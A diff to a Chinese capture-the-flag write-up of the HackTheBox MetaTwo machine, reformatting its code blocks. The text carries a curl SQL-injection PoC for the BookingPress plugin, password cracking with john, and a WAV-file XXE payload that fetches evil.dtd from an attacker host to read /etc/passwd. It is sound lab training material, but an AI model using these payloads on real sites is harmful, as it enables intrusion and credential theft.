@@ -38,7 +38,7 @@
 #### WPscan扫描（无option）
 
 既然是WordPress，那就先用WPscan扫一波：
-```
+```bash
 Interesting Finding(s):
 
 [+] Headers
@@ -68,8 +68,7 @@ Interesting Finding(s):
 [+] WordPress readme found: http://metapress.htb/readme.html
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
-
-...
+……
 ```
 
 由于最开始没加参数漏了很多信息，于是先只看到了这几项感兴趣的：
@@ -91,7 +90,7 @@ Interesting Finding(s):
 #### XML-RPC暴破
 由于没什么突破点，不得已尝试一下`XML-RPC`暴破。  
 用[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#xml-rpc)里提到的自动脚本跑了一波默认密码字典（因为觉得如果思路对的话应该不会很难，那么用默认字典即可）
-```
+```bash
 $ ./exploit.py http://metapress.htb 10 10
 __          _________   __      _       _ _
 \ \        / /  __ \ \ / /     | |     (_) |
@@ -139,10 +138,10 @@ __          _________   __      _       _ _
 #### WPscan扫描（有option）
 
 其实是第一次打WordPress……搜了一下WPscan的用法后加上参数再扫了一波：
-```          
+```bash
 $ wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/ --plugins-detection aggressive
 
-...
+……
 
 [i] Plugin(s) Identified:
 
@@ -161,7 +160,7 @@ $ wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/ --plugins-dete
  | Confirmed By: Translation File (Aggressive Detection)
  |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'
 
-...
+……
 
 [i] User(s) Identified:
 
@@ -180,13 +179,12 @@ $ wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/ --plugins-dete
 [+] manager
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
-
 ```
 
 ### PoC（CVE-2022-0739）
 
 发现了一个疑似有漏洞的插件。谷歌一波看到这个[PoC](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357):  
-```
+```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
   --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
 ```
@@ -200,7 +198,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 Burp其实在最开始就开了的，看了眼history，在POST数据里发现了 `_wpnonce` 这个参数！开整！
 
 获得两位用户的hash：
-```
+```bash
 $ python booking-press-expl.py -u 'http://metapress.htb' -n afab51c6c0
 - BookingPress PoC
 -- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
@@ -211,7 +209,7 @@ $ python booking-press-expl.py -u 'http://metapress.htb' -n afab51c6c0
 
 #### john暴破hash
 
-```
+```bash
 $ john --show --format=phpass hash.txt 
 manager:partylikearockstar
 ```
@@ -232,7 +230,7 @@ admin账号没有暴破成功。姑且用manager登陆一下WordPress。
 
 
 试了一下接收响应，成功返回了 `/etc/passwd` 的base64编码：
-```
+```bash
 $ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.6:80/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
 
 
@@ -278,7 +276,7 @@ DB似乎目前还无从下手，但别忘记我们扫到过FTP端口。
 *冲了一会儿浪，FTP下载完毕，竟然有两千多个文件……*
 
 email这个文件夹里的文件让人感兴趣，在里面发现了用户 `jnelson` 的邮箱&密码（现在想想根本没必要把整个FTP的文件都下下来……）：  
-```
+```bash
 $ cat send_email.php             
 <?php
 /*
@@ -321,7 +319,7 @@ $mail->Body = "<i>We just started our new blog metapress.htb!</i>";
 
 ## flag: user
 
-```
+```bash
 jnelson@meta2:~$ cat user.txt 
 819…………78428
 ```
@@ -330,7 +328,7 @@ jnelson@meta2:~$ cat user.txt
 ## Privilege Escalation
 
 由于之前XXE的漏洞中获取的响应里有DB的账户密码，`/etc/hosts` 文件里也有mysql用户，遂尝试一波连接DB。但是结果显示拒绝我收集到的 `blog` 用户来进行访问……
-```
+```bash
 jnelson@meta2:~$ mysql -u blog 
 ERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: NO)
 jnelson@meta2:~$ mysql -u blog -h localhost
@@ -343,7 +341,7 @@ ERROR 1045 (28000): Access denied for user 'blog'@'localhost' (using password: N
 - 搜了下SUID文件，没发现异常
 - 看了眼用户的家目录，发现个不寻常的文件名，在里面发现了root的什么密钥文件：
 
-```
+```bash
 jnelson@meta2:~/.passpie/ssh$ cat root.pass 
 comment: ''
 fullname: root@ssh
@@ -379,7 +377,7 @@ lpF0RatbxQGWBks5F3o=
 看了一下这个 `passpie` 是个命令。  
 `list` 看了看有两个用户，有个 `export`，那试试导出密码。  
 不过似乎要当前用户的什么密码短语，试了下ssh的密码不行： 
-```
+```bash
 jnelson@meta2:~/.passpie/ssh$ which passpie
 /usr/local/bin/passpie
 jnelson@meta2:~/.passpie/ssh$ passpie --help
@@ -409,7 +407,7 @@ Error: Wrong passphrase
 
 
 又看了一圈，发现了个密钥对，估计跟那个密码短语有关：
-```
+```bash
 jnelson@meta2:~/.passpie$ cat .keys 
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 
@@ -505,7 +503,7 @@ o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
 
 先把文件下到本地。  
 然后尝试john。不过报错说文件只需要私钥，那就整理一下再继续：
-```
+```bash
 $ scp -r jnelson@10.10.11.186:/home/jnelson/.passpie .
 
 
@@ -530,7 +528,7 @@ blink182         (Passpie)
 
 OK！  
 再到目标机试试 `export`：
-```
+```bash
 jnelson@meta2:~$ passpie export pass
 Passphrase: 
 jnelson@meta2:~$ cat pass 
@@ -555,7 +553,7 @@ version: 1.0
 
 ## flag: root
 
-```
+```bash
 jnelson@meta2:~$ su -
 Password: 
 root@meta2:~# cat 
